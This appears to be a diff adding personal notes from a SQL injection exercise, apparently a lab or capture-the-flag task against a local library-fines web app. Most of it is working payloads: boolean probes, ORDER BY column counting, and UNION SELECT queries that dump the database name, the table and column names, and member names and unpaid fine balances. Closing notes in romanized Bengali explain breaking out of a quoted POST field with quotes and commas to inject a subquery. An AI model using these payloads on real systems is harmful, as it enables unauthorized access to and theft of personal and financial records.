@@ -1,0 +1,73 @@
+
+
+
+
+
+
+
+
+password' and '1'='1
+
+password' and '1'='0
+
+
+password' order by 1 -- -
+password' order by 2 -- -
+password' order by 3 -- -
+password' order by 4 -- -
+password' order by 5 -- -
+password' order by 6 -- -
+
+' union select 1,2,3,4,5 -- -
+
+
+' union select 1, database(), 3, 4, 5 -- -
+
+' union select 1, group_concat(table_name), 3, 4, 5 from information_schema.tables where table_schema=database() -- -
+
+
+' union select 1, group_concat(column_name), 3, 4, 5 from information_schema.columns where table_name='member' -- -
+
+
+' union select 1, group_concat(id, ' ', name, ': ', balance, '<br>'), 3, 4, 5 from member -- -
+
+' union select 
+    1, 
+    group_concat(
+        m.id, ' ', m.first_name, ' ', m.last_name, ': $', 
+        IFNULL(SUM(f.amount), 0), 
+        '<br>'
+    ), 
+    3, 4, 5
+from member m 
+left join fine_record f on m.id = f.member_id and f.status = 'UNPAID'
+group by m.id -- -
+
+await fetch("http://localhost:4001/list", {
+    "credentials": "include",
+    "headers": {
+        "Content-Type": "application/x-www-form-urlencoded",
+    },
+    "body": "title=hi&price=100",
+    "method": "POST",
+});
+
+
+way:
+2 ta ' dibo
+''
+
+then eder moddhe 2 ta , dibo
+
+',,'
+
+"title=I+owe',,'+in+fines&price=',,'"
+
+erpor 2 ta commar moddhe 
+(
+    dibo <- ekhane select (...) query dibo
+)
+
+thats it
+
+
